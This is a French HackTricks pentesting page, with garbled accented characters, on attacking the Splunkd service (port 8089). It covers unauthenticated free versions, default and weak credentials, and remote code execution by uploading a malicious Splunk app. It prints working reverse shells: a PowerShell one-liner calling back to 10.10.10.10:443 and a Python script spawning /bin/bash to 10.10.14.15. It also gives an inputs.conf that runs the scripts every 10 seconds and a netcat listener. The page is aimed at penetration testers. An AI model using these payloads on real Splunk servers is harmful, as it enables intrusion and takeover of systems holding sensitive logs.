# 8089 - Test de pÃ©nÃ©tration de Splunkd

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

**Splunk** est un outil d'analyse de journaux utilisÃ© pour collecter, analyser et visualiser des donnÃ©es. Bien qu'il n'ait pas Ã©tÃ© initialement conÃ§u pour Ãªtre un outil SIEM, Splunk est souvent utilisÃ© pour la **surveillance de la sÃ©curitÃ© et l'analyse commerciale**. Les dÃ©ploiements Splunk sont souvent utilisÃ©s pour stocker des donnÃ©es sensibles et pourraient fournir une mine d'informations pour un attaquant en cas de compromission.

**Port par dÃ©faut :** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
Le serveur web Splunk fonctionne par dÃ©faut sur le port 8000.
{% endhint %}

## Ã‰numÃ©ration

### Version gratuite

La version d'essai de Splunk Enterprise se transforme en **version gratuite aprÃ¨s 60 jours**, qui **ne nÃ©cessite pas d'authentification**. Il n'est pas rare que les administrateurs systÃ¨me installent une version d'essai de Splunk pour la tester, qui est **ensuite oubliÃ©e**. Cela se convertira automatiquement en version gratuite qui n'a aucune forme d'authentification, introduisant une faille de sÃ©curitÃ© dans l'environnement. Certaines organisations peuvent opter pour la version gratuite en raison de contraintes budgÃ©taires, sans comprendre pleinement les implications de l'absence de gestion des utilisateurs/roles.

### Identifiants par dÃ©faut

Sur les anciennes versions de Splunk, les identifiants par dÃ©faut sont **`admin:changeme`**, qui sont commodÃ©ment affichÃ©s sur la page de connexion.\
Cependant, **la derniÃ¨re version de Splunk** dÃ©finit **les identifiants** **pendant le processus d'installation**. Si les identifiants par dÃ©faut ne fonctionnent pas, il vaut la peine de vÃ©rifier les mots de passe faibles courants tels que `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

### Obtenir des informations

Une fois connectÃ© Ã  Splunk, nous pouvons **parcourir les donnÃ©es**, exÃ©cuter des **rapports**, crÃ©er des **tableaux de bord**, **installer des applications** Ã  partir de la bibliothÃ¨que Splunkbase et installer des applications personnalisÃ©es.\
Vous pouvez Ã©galement exÃ©cuter du code : Splunk a plusieurs faÃ§ons d'**exÃ©cuter du code**, telles que des applications Django cÃ´tÃ© serveur, des points de terminaison REST, des entrÃ©es scriptÃ©es et des scripts d'alerte. Une mÃ©thode courante pour obtenir une exÃ©cution de code Ã  distance sur un serveur Splunk est l'utilisation d'une entrÃ©e scriptÃ©e.

De plus, comme Splunk peut Ãªtre installÃ© sur des hÃ´tes Windows ou Linux, des entrÃ©es scriptÃ©es peuvent Ãªtre crÃ©Ã©es pour exÃ©cuter des scripts Bash, PowerShell ou Batch.

### Shodan

* `Splunk build`

## RCE

### CrÃ©er une application personnalisÃ©e

Une application personnalisÃ©e peut exÃ©cuter des scripts **Python, Batch, Bash ou PowerShell**.\
Notez que **Splunk est livrÃ© avec Python installÃ©**, donc mÃªme dans les systÃ¨mes **Windows**, vous pourrez exÃ©cuter du code python.

Vous pouvez utiliser [**ce**](https://github.com/0xjpuff/reverse\_shell\_splunk) package Splunk pour nous aider. Le rÃ©pertoire **`bin`** dans ce dÃ©pÃ´t contient des exemples pour [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) et [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Marchons Ã©tape par Ã©tape.

Pour ce faire, nous devons d'abord crÃ©er une application Splunk personnalisÃ©e en utilisant la structure de rÃ©pertoire suivante :
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
Le rÃ©pertoire **`bin`** contiendra tous les **scripts que nous avons l'intention d'exÃ©cuter** (dans ce cas, un shell inversÃ© **PowerShell**), et le rÃ©pertoire par dÃ©faut contiendra notre fichier `inputs.conf`. Notre shell inversÃ© sera une **commande PowerShell en une ligne :**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Le fichier [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) indique Ã  Splunk **quel script exÃ©cuter** et toutes autres conditions. Ici, nous activons l'application et indiquons Ã  Splunk d'exÃ©cuter le script toutes les 10 secondes. L'intervalle est toujours en secondes, et l'entrÃ©e (script) ne s'exÃ©cutera que si ce paramÃ¨tre est prÃ©sent.
```shell-session
cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Nous avons besoin du fichier `.bat`, qui s'exÃ©cutera lors du dÃ©ploiement de l'application et exÃ©cutera la commande PowerShell en une ligne.

La prochaine Ã©tape consiste Ã  choisir `Installer l'application Ã  partir du fichier` et Ã  tÃ©lÃ©charger l'application.

<figure><img src="../.gitbook/assets/image (4) (5) (1).png" alt=""><figcaption></figcaption></figure>

Avant de tÃ©lÃ©charger l'application personnalisÃ©e malveillante, commenÃ§ons par dÃ©marrer un Ã©couteur en utilisant Netcat ou [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Sur la page `TÃ©lÃ©charger l'application`, cliquez sur parcourir, choisissez le tarball que nous avons crÃ©Ã© prÃ©cÃ©demment et cliquez sur `TÃ©lÃ©charger`. DÃ¨s que nous tÃ©lÃ©chargeons l'application, un shell inversÃ© est reÃ§u et l'Ã©tat de l'application sera automatiquement basculÃ© sur `ActivÃ©`.

#### Linux

Si nous avions affaire Ã  un hÃ´te **Linux**, nous devrions **modifier le script Python `rev.py`** avant de crÃ©er le tarball et de tÃ©lÃ©charger l'application malveillante personnalisÃ©e. Le reste du processus serait identique et nous obtiendrions une connexion de shell inversÃ© sur notre Ã©couteur Netcat et nous serions prÃªts Ã  partir.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Ã‰lÃ©vation de privilÃ¨ges

Sur la page suivante, vous pouvez trouver une explication sur la faÃ§on dont ce service peut Ãªtre utilisÃ© de maniÃ¨re abusive pour Ã©lever les privilÃ¨ges et obtenir une persistance :

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## RÃ©fÃ©rences

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
